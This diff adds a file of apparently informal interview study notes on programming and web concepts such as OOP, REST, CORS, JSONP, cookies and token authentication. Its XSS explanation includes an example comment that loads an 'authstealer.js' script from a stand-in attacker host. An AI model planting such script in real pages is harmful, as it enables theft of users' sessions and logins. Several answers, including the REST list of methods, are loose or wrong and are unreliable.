@@ -1,0 +1,123 @@
+========================
+= 1. GENERAL QUESTIONS =
+========================
+
+
+1. What is Polymorphism?
+
+Ability of a function to handle objects of many types. i.e. shape.draw() vs drawCircle() / drawRectange() etc.
+
+
+2. What is Encapsulation?
+
+Packing of data and functions into a single component. Data hiding. Protect anything which is prone to change.
+
+
+3. What is Inversion of Control?
+
+A design in which custom-written parts of a program receive the flow of control from a library.
+
+
+4. What is Tail Recursion?
+
+return x + recsum(x - 1) is considered regular recursion. return recsum(x - 1, running_total + x) is considered tail recursion because with each evaluation of the recursive call, the running_total is updated.
+
+
+5. What is HTTP?
+
+Hypertext transfer protocol is a communications protocol used to send and receive webpages and files across the internet.
+
+
+6. What is HTTPS?
+
+HTTPS is a secured version of HTTP. It encrypts data sent and received.
+
+
+7. What is object-orientated programming?
+
+OOP is programming focused on objects rather than actions, and data rather than logic. We care more about the objects we want to manipulate rather than the logic required to manipulate them. Objects are things like Humans (Eat, Sleep, Drink, etc), Building (Floors, structure type, etc).
+
+
+8. What is REST?
+
+Representational state transfer. Implementation intended to increase efficiency in communication. Example of non-RESTful system is having an entire home movie collection. A RESTful counterpart would be just streaming the movie you need at whatever time. Proper implementation of GET, POST, PUT, DELETE, EDIT, UPDATE, DESTROY is part of being RESTful.
+
+
+9. What is an Idempotent operation?
+
+PUT and DELETE are idempotent meaning the operation will produce the same result no matter how many times its repeated.
+
+
+10. What is a Nullipotent operation?
+
+GET method is nullipotent meaning its safe - calling it produces no side effects.
+
+
+11. What are some web security vulnerabilities?
+
+XSS - Cross site scripting -> injecting client side scripts into web pages viewed by others. Example is The attacker adds the following comment: Great price for a great item! Read my review here <script src="http://hackersite.com/authstealer.js"> </script>.
+
+CSRF - Cross site request forgery -> unauthorized commands transmitted from a user that the website trusts. Examples include an attacker adding items to someone else's cart, changing addresses, or changing login details.
+
+Session fixation - Hijack a user session
+
+SQL Injection - inputting SQL to fields to drop tables and stuff
+
+
+13. What is AJAX?
+
+Asynchronous Javascript and XML. Sends data to and from a server asynchronously (in the background) without interfering with the display and behaviour of the existing page. Allows content to be changed dynamically without needing to reload the page.
+
+
+14. What is JSON?
+
+Javascript Object Notation. Easy to read and write data stored like objects
+
+
+15. What is JSONP?
+
+JSON with Padding. Bypasses the cross-domain policies in web-browsers (cannot make AJAX requests to a webpage percieved to be on a different server by the browser). JSONP not dispatched by XMLHTTPRequest, instead creates a <script> tag, whose sources is the target URL, and then added to the DOM. Difference in response is JSONP is passed as an argument to a callback.
+
+
+16. What is CORS?
+
+Cross-origin resource sharing -> allows restricted resources such as fonts on a web page to be requested from another domain outside the domain from which the first resource was served.
+  Example:
+  Imagine alice.com has some data that bob.com wants to access. This type of request traditionally wouldnt be allowed under the browsers same origin policy. However, with CORS requests, alice.com can add a few special response headers that allow bob.com to access it.
+
+
+17. What is a Websocket?
+
+Persistent connection between a web browser and a server. A client or server can send back a message at any time. Is it stateful (not stateless like traditional http). A single server is aware of all of its connections, allowing you to communicate with any number of open connections. (i.e. chat client)
+
+
+18. Cookies - Sessions vs Persistent
+
+Cookies are strings of data a server sends to the browser. When a browser requests an object from the some domain in the future, the browser will send the same string of data back to the origin server.
+
+Session cookie - no expiration date. Stored in memory and not written to disk. When the browser is closed, the session is lost
+
+Persistent cookie - has an expiration date. On the date, it will be removed from the disk
+
+
+19. Storage sessionStorage vs localStorage
+
+Both are storage in the browser. sessionStorage is a session, it gets cleared when browser is closed, and localStorage is persistent
+
+
+20. Authentication using cookies, JWT
+
+Cookie based auth is stateful. That means a record or ession must be kept on both server and client. The server needs to keep track of active cookies in a database, while the client created a session identifier.
+
+Token based auth is stateless. The server does not keep a record. Every request to the server is accompanied by a token which the server verifies.
+
+
+==============
+= Javascript =
+==============
+
+
+1. What is the "this" keyword?
+
+In most languages, ‘this’ is a reference to the current object instantiated by the class. In JavaScript, ‘this’ normally refers to the object which ‘owns’ the method, but it depends on how a function is called. 
+
